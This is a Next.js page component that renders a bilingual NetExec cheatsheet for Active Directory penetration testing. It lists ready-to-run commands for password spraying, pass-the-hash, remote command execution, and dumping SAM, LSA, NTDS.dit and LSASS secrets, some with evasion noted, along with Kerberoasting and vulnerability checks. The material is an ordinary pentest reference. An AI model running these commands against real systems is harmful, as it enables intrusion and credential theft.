"use client";

import { useLanguage } from "@/components/LanguageProvider";
import { CheatsheetCommandCard } from "@/components/CheatsheetCommandCard";

export default function NetexecPage() {
  const { lang } = useLanguage();
  const translateWhy = (text: string) => {
    if (lang === "fr") return text;
    const exact: Record<string, string> = {
      "Installe NetExec proprement via pipx depuis le depot officiel.":
        "Installs NetExec cleanly via pipx from the official repository.",
      "Verifie que le binaire est accessible et affiche la version installee.":
        "Verifies that the binary is available and shows the installed version.",
      "Affiche l'aide globale et la liste des protocoles disponibles.":
        "Displays global help and the list of available protocols.",
      "Affiche toutes les options du module SMB.":
        "Displays all options for the SMB module.",
      "Syntaxe commune a tous les protocoles.":
        "Shared syntax used across all protocols.",
      "Cible : IP unique, plage CIDR, range ou fichier avec -t targets.txt.":
        "Target can be a single IP, a CIDR range, a host range, or a file with `-t targets.txt`.",
      "Null session SMB : teste l'acces anonyme sans identifiants.":
        "SMB null session: tests anonymous access without credentials.",
      "Null session LDAP : idem pour le protocole LDAP.":
        "LDAP null session: same check for the LDAP protocol.",
      "Tente l'acces avec le compte Guest (souvent actif sur vieux postes).":
        "Attempts access with the Guest account (often still enabled on legacy hosts).",
      "Authentification domaine classique user/password.":
        "Standard domain authentication with username and password.",
      "Force l'authentification locale (hors contexte domaine).":
        "Forces local authentication outside of domain context.",
      "Specifies le domaine explicitement pour un contexte multi-domaines.":
        "Explicitly sets the domain for multi-domain environments.",
      "Authentification via hash NT (Pass-the-Hash) sans connaitre le mot de passe en clair.":
        "Authenticates with an NT hash (Pass-the-Hash) without knowing the plaintext password.",
      "Format LM:NT complet si le LM hash est disponible.":
        "Uses full LM:NT format when an LM hash is available.",
      "PTH en mode local-auth pour les comptes machine ou locaux.":
        "Pass-the-Hash in local-auth mode for machine or local accounts.",
      "Force l'authentification Kerberos au lieu de NTLM.":
        "Forces Kerberos authentication instead of NTLM.",
      "Utilise le cache Kerberos existant (ccache) plutot que de re-s'authentifier.":
        "Uses the existing Kerberos cache (`ccache`) instead of re-authenticating.",
      "Injecte un ccache specifique (post-getTGT/getST) pour l'authentification.":
        "Injects a specific `ccache` (after `getTGT`/`getST`) for authentication.",
      "Cree le produit cartesien user x password (attention aux lockouts).":
        "Builds the full user x password cartesian product (watch for account lockouts).",
      "Teste user[i]/pass[i] en mode paire lineaire, sans croisement.":
        "Tests `user[i]/pass[i]` in linear pair mode, without cross-combinations.",
      "Spray de hashes NT contre une liste d'utilisateurs, un hash par user.":
        "Performs NT hash spraying against a user list, one hash per user.",
      "Continue apres le premier succes, utile pour identifier tous les comptes valides.":
        "Continues after the first success, useful to identify all valid accounts.",
      "Sonde SMB : hostname, domaine, OS, signing et version SMB.":
        "SMB probe: hostname, domain, OS, SMB signing, and SMB version.",
      "Discovery reseau : identifie tous les hotes SMB actifs sur un /24.":
        "Network discovery: identifies all active SMB hosts on a /24.",
      "Liste les comptes utilisateurs du domaine via SMB.":
        "Lists domain user accounts through SMB.",
      "Liste les groupes du domaine et leurs membres.":
        "Lists domain groups and their members.",
      "Enumere les groupes locaux de la machine cible.":
        "Enumerates local groups on the target machine.",
      "Brute-force des RID pour decouvrir des comptes meme sans acces annuaire.":
        "Performs RID brute force to discover accounts even without directory access.",
      "Affiche les sessions SMB actives sur la cible.":
        "Displays active SMB sessions on the target.",
      "Identifie les utilisateurs actuellement connectes sur la machine.":
        "Identifies users currently logged on to the machine.",
      "Recupere la politique de mot de passe du domaine (lockout threshold, etc.).":
        "Retrieves domain password policy (lockout threshold, etc.).",
      "Genere une liste d'hotes SMB ne forcant pas la signature (cibles relay).":
        "Generates a list of SMB hosts that do not enforce signing (relay candidates).",
      "Enumere les partages accessibles et les permissions (READ/WRITE).":
        "Enumerates accessible shares and their permissions (READ/WRITE).",
      "Meme chose en null session pour detecter les partages publics.":
        "Same check in null session mode to detect public shares.",
      "Spider recursif de tous les partages accessibles, liste tous les fichiers.":
        "Recursively spiders all accessible shares and lists every file.",
      "Spider avec telechargement automatique des fichiers trouves.":
        "Spider mode with automatic download of discovered files.",
      "Telecharge un fichier depuis un partage SMB distant.":
        "Downloads a file from a remote SMB share.",
      "Uploade un fichier local vers un partage SMB distant.":
        "Uploads a local file to a remote SMB share.",
      "Execute une commande shell sur la cible via SMB (CreateProcess).":
        "Executes a shell command on the target through SMB (`CreateProcess`).",
      "Execute une commande PowerShell sur la cible via SMB.":
        "Executes a PowerShell command on the target through SMB.",
      "Force le mode d'execution smbexec (moins bruyant que psexec).":
        "Forces `smbexec` execution mode (usually quieter than `psexec`).",
      "Force le mode d'execution WMI (pas de service cree).":
        "Forces WMI execution mode (no service creation).",
      "Dump les hashes du SAM local (comptes locaux uniquement).":
        "Dumps local SAM hashes (local accounts only).",
      "Dump les secrets LSA (mots de passe services, cached creds, etc.).":
        "Dumps LSA secrets (service passwords, cached credentials, etc.).",
      "Dump le NTDS.dit via VSS pour recuperer tous les hashes du domaine (DC uniquement).":
        "Dumps `NTDS.dit` through VSS to recover all domain hashes (DC only).",
      "Dump uniquement le hash d'un utilisateur specifique depuis NTDS.":
        "Dumps only one specific user hash from NTDS.",
      "Dump LSASS en memoire via lsassy pour extraire les credentials en clair.":
        "Dumps LSASS in memory via `lsassy` to extract plaintext credentials.",
      "Dump LSASS via nanodump (evasion meilleure qu'un dump classique).":
        "Dumps LSASS via `nanodump` (better evasion than a classic dump).",
      "Cherche des mots de passe en clair dans les GPP (SYSVOL).":
        "Searches for plaintext passwords in GPP (`SYSVOL`).",
      "Tente de dechiffrer les secrets DPAPI de l'utilisateur connecte.":
        "Attempts to decrypt DPAPI secrets for the logged-in user.",
      "Detecte la vulnerabilite ZeroLogon (CVE-2020-1472) sur le DC.":
        "Detects the ZeroLogon vulnerability (`CVE-2020-1472`) on the DC.",
      "Teste la coercition PetitPotam (Printer Spooler / EfsRpc).":
        "Tests PetitPotam coercion (`Printer Spooler` / `EfsRpc`).",
      "Detecte la vulnerabilite noPac (CVE-2021-42278/42287).":
        "Detects the noPac vulnerability (`CVE-2021-42278/42287`).",
      "Detecte PrintNightmare (CVE-2021-1675) sur le spooler d'impression.":
        "Detects PrintNightmare (`CVE-2021-1675`) on the print spooler.",
      "Enumere les produits antivirus installes sur la machine cible.":
        "Enumerates antivirus products installed on the target machine.",
      "Liste les utilisateurs AD via LDAP.":
        "Lists AD users through LDAP.",
      "Liste les groupes AD et leurs membres.":
        "Lists AD groups and their members.",
      "Trouve les objets proteges par AdminSDHolder (adminCount=1).":
        "Finds objects protected by AdminSDHolder (`adminCount=1`).",
      "Identifie les comptes avec unconstrained delegation.":
        "Identifies accounts configured with unconstrained delegation.",
      "Trouve les comptes sans politique de mot de passe obligatoire.":
        "Finds accounts without an enforced password policy.",
      "Decouvre toutes les configurations de delegation (constrained/unconstrained/RBCD).":
        "Discovers all delegation configurations (constrained/unconstrained/RBCD).",
      "Recupere les TGS des comptes avec SPN pour crackage offline (Kerberoasting).":
        "Retrieves TGS tickets from SPN accounts for offline cracking (Kerberoasting).",
      "Recupere les AS-REP des comptes sans pre-auth Kerberos.":
        "Retrieves AS-REP tickets from accounts without Kerberos pre-auth.",
      "Collecte toutes les donnees BloodHound CE (users, groups, sessions, ACLs, GPOs, trusts).":
        "Collects all BloodHound CE data (users, groups, sessions, ACLs, GPOs, trusts).",
      "Collecte uniquement les donnees DC (plus rapide, moins de bruit reseau).":
        "Collects only DC data (faster and with less network noise).",
      "Enumere les Certificate Authority et templates ADCS, signale les mauvaises configs ESC.":
        "Enumerates Certificate Authorities and ADCS templates, and flags ESC misconfigurations.",
      "Verifie le Machine Account Quota (combien de comptes machine on peut creer).":
        "Checks Machine Account Quota (how many machine accounts can be created).",
      "Lit les mots de passe LAPS v1/v2 si les ACL le permettent.":
        "Reads LAPS v1/v2 passwords when ACLs allow access.",
      "Enumere les Group Managed Service Accounts et leurs attributs.":
        "Enumerates Group Managed Service Accounts and their attributes.",
      "Convertit un ID gMSA en nom lisible.":
        "Converts a gMSA ID into a readable name.",
      "Dechiffre les secrets gMSA stockes dans LSA si les droits le permettent.":
        "Decrypts gMSA secrets stored in LSA when permissions allow it.",
      "Authentification SQL Server en mode Windows (domaine).":
        "SQL Server authentication in Windows (domain) mode.",
      "Authentification SQL locale (SQL login, pas Windows auth).":
        "Local SQL authentication (SQL login, not Windows auth).",
      "Force le domaine pour l'authentification Windows sur MSSQL.":
        "Forces the domain for Windows authentication on MSSQL.",
      "Execute une requete SQL directement.":
        "Executes an SQL query directly.",
      "Liste toutes les bases de donnees disponibles sur l'instance.":
        "Lists all databases available on the instance.",
      "Brute-force des RID pour cartographier les logins SQL et Windows.":
        "Performs RID brute force to map SQL and Windows logins.",
      "Execute une commande OS via xp_cmdshell (doit etre active ou activable).":
        "Executes an OS command through `xp_cmdshell` (must be enabled or enableable).",
      "Execute du PowerShell via xp_cmdshell.":
        "Executes PowerShell through `xp_cmdshell`.",
      "Telecharge un fichier depuis la cible via MSSQL (BULK INSERT / OPENROWSET).":
        "Downloads a file from the target through MSSQL (`BULK INSERT` / `OPENROWSET`).",
      "Uploade un fichier local sur la cible via MSSQL.":
        "Uploads a local file to the target through MSSQL.",
      "Valide les credentials sur WinRM et verifie si le compte est admin.":
        "Validates credentials on WinRM and checks whether the account is admin.",
      "Validation via hash NT sur WinRM (Pass-the-Hash).":
        "Validation through NT hash on WinRM (Pass-the-Hash).",
      "Spray de credentials sur WinRM en mode paire lineaire.":
        "Performs credential spraying on WinRM in linear pair mode.",
      "Execute une commande shell sur la cible via WinRM.":
        "Executes a shell command on the target through WinRM.",
      "Execute du PowerShell sur la cible via WinRM.":
        "Executes PowerShell on the target through WinRM.",
      "Valide des credentials SSH sur la cible.":
        "Validates SSH credentials on the target.",
      "Authentification SSH par cle privee.":
        "SSH authentication using a private key.",
      "Execute une commande sur la cible via SSH.":
        "Executes a command on the target through SSH.",
    };
    return exact[text] ?? "Command purpose available in French only.";
  };
  type CommandItem = {
    cmd: string;
    why: string;
  };

  type CommandSection = {
    title: string;
    groupId?: string;
    commands: CommandItem[];
  };

  const installMethods: CommandSection = {
    title: "Installation",
    commands: [
      {
        cmd: "sudo apt install pipx git\npipx ensurepath\npipx install git+https://github.com/Pennyw0rth/NetExec",
        why: "Installe NetExec proprement via pipx depuis le depot officiel.",
      },
      {
        cmd: "nxc --version",
        why: "Verifie que le binaire est accessible et affiche la version installee.",
      },
    ],
  };

  const basics: CommandSection = {
    title: "Verify + Syntax",
    commands: [
      { cmd: "nxc --help", why: "Affiche l'aide globale et la liste des protocoles disponibles." },
      { cmd: "nxc smb --help", why: "Affiche toutes les options du module SMB." },
      { cmd: "nxc <protocol> $TARGET -u $USER -p $PASS [options]", why: "Syntaxe commune a tous les protocoles." },
      { cmd: "nxc smb $TARGET", why: "Cible : IP unique, plage CIDR, range ou fichier avec -t targets.txt." },
    ],
  };

  const sections: CommandSection[] = [
    // ── Auth Methods ────────────────────────────────────────────────
    {
      title: "Auth - Null Session",
      groupId: "auth",
      commands: [
        { cmd: "nxc smb $TARGET -u '' -p ''", why: "Null session SMB : teste l'acces anonyme sans identifiants." },
        { cmd: "nxc ldap $TARGET -u '' -p ''", why: "Null session LDAP : idem pour le protocole LDAP." },
      ],
    },
    {
      title: "Auth - Guest",
      commands: [
        { cmd: "nxc smb $TARGET -u 'Guest' -p ''", why: "Tente l'acces avec le compte Guest (souvent actif sur vieux postes)." },
      ],
    },
    {
      title: "Auth - Password",
      commands: [
        { cmd: "nxc smb $TARGET -u $USER -p $PASS", why: "Authentification domaine classique user/password." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS --local-auth", why: "Force l'authentification locale (hors contexte domaine)." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS -d $DOMAIN", why: "Specifies le domaine explicitement pour un contexte multi-domaines." },
      ],
    },
    {
      title: "Auth - Pass-the-Hash",
      commands: [
        { cmd: "nxc smb $TARGET -u $USER -H $NTHASH", why: "Authentification via hash NT (Pass-the-Hash) sans connaitre le mot de passe en clair." },
        { cmd: "nxc smb $TARGET -u $USER -H $LMHASH:$NTHASH", why: "Format LM:NT complet si le LM hash est disponible." },
        { cmd: "nxc smb $TARGET -u $USER -H $NTHASH --local-auth", why: "PTH en mode local-auth pour les comptes machine ou locaux." },
      ],
    },
    {
      title: "Auth - Kerberos",
      commands: [
        { cmd: "nxc smb $TARGET -u $USER -p $PASS -k", why: "Force l'authentification Kerberos au lieu de NTLM." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS --use-kcache", why: "Utilise le cache Kerberos existant (ccache) plutot que de re-s'authentifier." },
        { cmd: "KRB5CCNAME=$CCACHE nxc smb $TARGET -u $USER -p '' --use-kcache", why: "Injecte un ccache specifique (post-getTGT/getST) pour l'authentification." },
      ],
    },
    {
      title: "Auth - Listes de credentials",
      commands: [
        { cmd: "nxc smb $TARGET -u users.txt -p passwords.txt", why: "Cree le produit cartesien user x password (attention aux lockouts)." },
        { cmd: "nxc smb $TARGET -u users.txt -p passwords.txt --no-bruteforce", why: "Teste user[i]/pass[i] en mode paire lineaire, sans croisement." },
        { cmd: "nxc smb $TARGET -u users.txt -H hashes.txt --no-bruteforce", why: "Spray de hashes NT contre une liste d'utilisateurs, un hash par user." },
        { cmd: "nxc smb $TARGET -u users.txt -p passwords.txt --continue-on-success", why: "Continue apres le premier succes, utile pour identifier tous les comptes valides." },
      ],
    },
    // ── SMB ────────────────────────────────────────────────────────
    {
      title: "SMB - Verification",
      groupId: "smb",
      commands: [
        { cmd: "nxc smb $TARGET", why: "Sonde SMB : hostname, domaine, OS, signing et version SMB." },
        { cmd: "nxc smb $CIDR", why: "Discovery reseau : identifie tous les hotes SMB actifs sur un /24." },
      ],
    },
    {
      title: "SMB - Enumeration",
      commands: [
        { cmd: "nxc smb $TARGET -u $USER -p $PASS --users", why: "Liste les comptes utilisateurs du domaine via SMB." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS --groups", why: "Liste les groupes du domaine et leurs membres." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS --local-groups", why: "Enumere les groupes locaux de la machine cible." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS --rid-brute", why: "Brute-force des RID pour decouvrir des comptes meme sans acces annuaire." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS --sessions", why: "Affiche les sessions SMB actives sur la cible." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS --loggedon-users", why: "Identifie les utilisateurs actuellement connectes sur la machine." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS --pass-pol", why: "Recupere la politique de mot de passe du domaine (lockout threshold, etc.)." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS --gen-relay-list relay.txt", why: "Genere une liste d'hotes SMB ne forcant pas la signature (cibles relay)." },
      ],
    },
    {
      title: "SMB - Shares",
      commands: [
        { cmd: "nxc smb $TARGET -u $USER -p $PASS --shares", why: "Enumere les partages accessibles et les permissions (READ/WRITE)." },
        { cmd: "nxc smb $TARGET -u '' -p '' --shares", why: "Meme chose en null session pour detecter les partages publics." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS -M spider_plus", why: "Spider recursif de tous les partages accessibles, liste tous les fichiers." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS -M spider_plus -o READ_ONLY=false", why: "Spider avec telechargement automatique des fichiers trouves." },
      ],
    },
    {
      title: "SMB - File Operations",
      commands: [
        { cmd: "nxc smb $TARGET -u $USER -p $PASS --get-file '\\\\share\\path\\file.txt' /local/dest.txt", why: "Telecharge un fichier depuis un partage SMB distant." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS --put-file /local/file.exe '\\\\share\\path\\file.exe'", why: "Uploade un fichier local vers un partage SMB distant." },
      ],
    },
    {
      title: "SMB - Command Execution",
      commands: [
        { cmd: "nxc smb $TARGET -u $USER -p $PASS -x 'whoami'", why: "Execute une commande shell sur la cible via SMB (CreateProcess)." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS -X 'Get-Process'", why: "Execute une commande PowerShell sur la cible via SMB." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS -x 'whoami' --exec-method smbexec", why: "Force le mode d'execution smbexec (moins bruyant que psexec)." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS -x 'whoami' --exec-method wmiexec", why: "Force le mode d'execution WMI (pas de service cree)." },
      ],
    },
    {
      title: "SMB - Credential Harvesting",
      commands: [
        { cmd: "nxc smb $TARGET -u $USER -p $PASS --sam", why: "Dump les hashes du SAM local (comptes locaux uniquement)." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS --lsa", why: "Dump les secrets LSA (mots de passe services, cached creds, etc.)." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS --ntds", why: "Dump le NTDS.dit via VSS pour recuperer tous les hashes du domaine (DC uniquement)." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS --ntds --user $TARGET_USER", why: "Dump uniquement le hash d'un utilisateur specifique depuis NTDS." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS -M lsassy", why: "Dump LSASS en memoire via lsassy pour extraire les credentials en clair." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS -M nanodump", why: "Dump LSASS via nanodump (evasion meilleure qu'un dump classique)." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS -M gpp_password", why: "Cherche des mots de passe en clair dans les GPP (SYSVOL)." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS -M dpapi", why: "Tente de dechiffrer les secrets DPAPI de l'utilisateur connecte." },
      ],
    },
    {
      title: "SMB - Vulnerability Scan",
      commands: [
        { cmd: "nxc smb $TARGET -u $USER -p $PASS -M zerologon", why: "Detecte la vulnerabilite ZeroLogon (CVE-2020-1472) sur le DC." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS -M petitpotam", why: "Teste la coercition PetitPotam (Printer Spooler / EfsRpc)." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS -M nopac", why: "Detecte la vulnerabilite noPac (CVE-2021-42278/42287)." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS -M printnightmare", why: "Detecte PrintNightmare (CVE-2021-1675) sur le spooler d'impression." },
        { cmd: "nxc smb $TARGET -u $USER -p $PASS -M enum_av", why: "Enumere les produits antivirus installes sur la machine cible." },
      ],
    },
    // ── LDAP ───────────────────────────────────────────────────────
    {
      title: "LDAP - Enumeration",
      groupId: "ldap",
      commands: [
        { cmd: "nxc ldap $TARGET -u $USER -p $PASS --users", why: "Liste les utilisateurs AD via LDAP." },
        { cmd: "nxc ldap $TARGET -u $USER -p $PASS --groups", why: "Liste les groupes AD et leurs membres." },
        { cmd: "nxc ldap $TARGET -u $USER -p $PASS --admin-count", why: "Trouve les objets proteges par AdminSDHolder (adminCount=1)." },
        { cmd: "nxc ldap $TARGET -u $USER -p $PASS --trusted-for-delegation", why: "Identifie les comptes avec unconstrained delegation." },
        { cmd: "nxc ldap $TARGET -u $USER -p $PASS --password-not-required", why: "Trouve les comptes sans politique de mot de passe obligatoire." },
        { cmd: "nxc ldap $TARGET -u $USER -p $PASS --find-delegation", why: "Decouvre toutes les configurations de delegation (constrained/unconstrained/RBCD)." },
      ],
    },
    {
      title: "LDAP - Kerberoasting / AS-REP",
      commands: [
        { cmd: "nxc ldap $TARGET -u $USER -p $PASS --kerberoasting kerberoast.txt", why: "Recupere les TGS des comptes avec SPN pour crackage offline (Kerberoasting)." },
        { cmd: "nxc ldap $TARGET -u $USER -p $PASS --asreproast asrep.txt", why: "Recupere les AS-REP des comptes sans pre-auth Kerberos." },
      ],
    },
    {
      title: "LDAP - BloodHound",
      commands: [
        { cmd: "nxc ldap $TARGET -u $USER -p $PASS --bloodhound -c All", why: "Collecte toutes les donnees BloodHound CE (users, groups, sessions, ACLs, GPOs, trusts)." },
        { cmd: "nxc ldap $TARGET -u $USER -p $PASS --bloodhound -c DCOnly", why: "Collecte uniquement les donnees DC (plus rapide, moins de bruit reseau)." },
      ],
    },
    {
      title: "LDAP - ADCS / LAPS / gMSA",
      commands: [
        { cmd: "nxc ldap $TARGET -u $USER -p $PASS -M adcs", why: "Enumere les Certificate Authority et templates ADCS, signale les mauvaises configs ESC." },
        { cmd: "nxc ldap $TARGET -u $USER -p $PASS -M maq", why: "Verifie le Machine Account Quota (combien de comptes machine on peut creer)." },
        { cmd: "nxc ldap $TARGET -u $USER -p $PASS --laps", why: "Lit les mots de passe LAPS v1/v2 si les ACL le permettent." },
        { cmd: "nxc ldap $TARGET -u $USER -p $PASS --gmsa", why: "Enumere les Group Managed Service Accounts et leurs attributs." },
        { cmd: "nxc ldap $TARGET -u $USER -p $PASS --gmsa-convert-id", why: "Convertit un ID gMSA en nom lisible." },
        { cmd: "nxc ldap $TARGET -u $USER -p $PASS --gmsa-decrypt-lsa", why: "Dechiffre les secrets gMSA stockes dans LSA si les droits le permettent." },
      ],
    },
    // ── MSSQL ──────────────────────────────────────────────────────
    {
      title: "MSSQL - Auth",
      groupId: "mssql",
      commands: [
        { cmd: "nxc mssql $TARGET -u $USER -p $PASS", why: "Authentification SQL Server en mode Windows (domaine)." },
        { cmd: "nxc mssql $TARGET -u $USER -p $PASS --local-auth", why: "Authentification SQL locale (SQL login, pas Windows auth)." },
        { cmd: "nxc mssql $TARGET -u $USER -p $PASS -d $DOMAIN", why: "Force le domaine pour l'authentification Windows sur MSSQL." },
      ],
    },
    {
      title: "MSSQL - Queries",
      commands: [
        { cmd: "nxc mssql $TARGET -u $USER -p $PASS -q 'SELECT @@version'", why: "Execute une requete SQL directement." },
        { cmd: "nxc mssql $TARGET -u $USER -p $PASS -q 'SELECT name FROM sys.databases'", why: "Liste toutes les bases de donnees disponibles sur l'instance." },
        { cmd: "nxc mssql $TARGET -u $USER -p $PASS --rid-brute", why: "Brute-force des RID pour cartographier les logins SQL et Windows." },
      ],
    },
    {
      title: "MSSQL - Command Execution",
      commands: [
        { cmd: "nxc mssql $TARGET -u $USER -p $PASS -x 'whoami'", why: "Execute une commande OS via xp_cmdshell (doit etre active ou activable)." },
        { cmd: "nxc mssql $TARGET -u $USER -p $PASS -X 'Get-Content C:\\Windows\\win.ini'", why: "Execute du PowerShell via xp_cmdshell." },
      ],
    },
    {
      title: "MSSQL - File Operations",
      commands: [
        { cmd: "nxc mssql $TARGET -u $USER -p $PASS --get-file 'C:\\path\\to\\file.txt' /local/dest.txt", why: "Telecharge un fichier depuis la cible via MSSQL (BULK INSERT / OPENROWSET)." },
        { cmd: "nxc mssql $TARGET -u $USER -p $PASS --put-file /local/file.exe 'C:\\Windows\\Temp\\file.exe'", why: "Uploade un fichier local sur la cible via MSSQL." },
      ],
    },
    // ── WinRM ──────────────────────────────────────────────────────
    {
      title: "WinRM - Validation",
      groupId: "winrm",
      commands: [
        { cmd: "nxc winrm $TARGET -u $USER -p $PASS", why: "Valide les credentials sur WinRM et verifie si le compte est admin." },
        { cmd: "nxc winrm $TARGET -u $USER -H $NTHASH", why: "Validation via hash NT sur WinRM (Pass-the-Hash)." },
        { cmd: "nxc winrm $TARGET -u users.txt -p passwords.txt --no-bruteforce", why: "Spray de credentials sur WinRM en mode paire lineaire." },
      ],
    },
    {
      title: "WinRM - Command Execution",
      commands: [
        { cmd: "nxc winrm $TARGET -u $USER -p $PASS -x 'whoami'", why: "Execute une commande shell sur la cible via WinRM." },
        { cmd: "nxc winrm $TARGET -u $USER -p $PASS -X 'Get-LocalUser'", why: "Execute du PowerShell sur la cible via WinRM." },
      ],
    },
    // ── SSH ────────────────────────────────────────────────────────
    {
      title: "SSH - Auth & Execution",
      groupId: "ssh",
      commands: [
        { cmd: "nxc ssh $TARGET -u $USER -p $PASS", why: "Valide des credentials SSH sur la cible." },
        { cmd: "nxc ssh $TARGET -u $USER --key-file ~/.ssh/id_rsa", why: "Authentification SSH par cle privee." },
        { cmd: "nxc ssh $TARGET -u $USER -p $PASS -x 'whoami'", why: "Execute une commande sur la cible via SSH." },
      ],
    },
  ];

  return (
    <div className="mx-auto max-w-3xl px-6 py-10 lg:px-10">
      <header className="mb-8 border-b border-border pb-6">
        <p className="mb-2 text-[11px] font-mono uppercase tracking-widest text-primary">
          Cheatsheets
        </p>
        <h1 className="text-2xl font-semibold tracking-tight text-foreground sm:text-3xl">
          NetExec
        </h1>
        <p className="mt-3 text-sm leading-7 text-muted-foreground">
          {lang === "fr"
            ? "Cheatsheet complete nxc : SMB, LDAP, MSSQL, WinRM, SSH. Auth, enumeration, exploitation et modules."
            : "Complete nxc cheatsheet: SMB, LDAP, MSSQL, WinRM, SSH. Auth, enumeration, exploitation and modules."}
        </p>
      </header>

      <section id="install" className="mb-6 rounded-sm border border-border p-5">
        <h2 className="mb-3 font-mono text-xs uppercase tracking-widest text-primary">{installMethods.title}</h2>
        <div className="space-y-4">
          {installMethods.commands.map((item) => (
            <CheatsheetCommandCard key={item.cmd} cmd={item.cmd} why={translateWhy(item.why)} lang={lang} />
          ))}
        </div>
      </section>

      <section id="syntax" className="mb-6 rounded-sm border border-border p-5">
        <h2 className="mb-3 font-mono text-xs uppercase tracking-widest text-primary">{basics.title}</h2>
        <div className="space-y-4">
          {basics.commands.map((item) => (
            <CheatsheetCommandCard key={item.cmd} cmd={item.cmd} why={translateWhy(item.why)} lang={lang} />
          ))}
        </div>
      </section>

      <section className="space-y-4">
        {sections.map((section) => (
          <article key={section.title} id={section.groupId} className="rounded-sm border border-border p-5">
            <h2 className="font-mono text-xs uppercase tracking-widest text-primary">
              {lang === "fr" && section.title === "Auth - Listes de credentials"
                ? "Auth - Listes de credentials"
                : section.title === "Auth - Listes de credentials"
                  ? "Auth - Credential Lists"
                  : section.title}
            </h2>
            <div className="mt-3 space-y-4">
              {section.commands.map((item) => (
                <CheatsheetCommandCard key={item.cmd} cmd={item.cmd} why={translateWhy(item.why)} lang={lang} />
              ))}
            </div>
          </article>
        ))}
      </section>
    </div>
  );
}
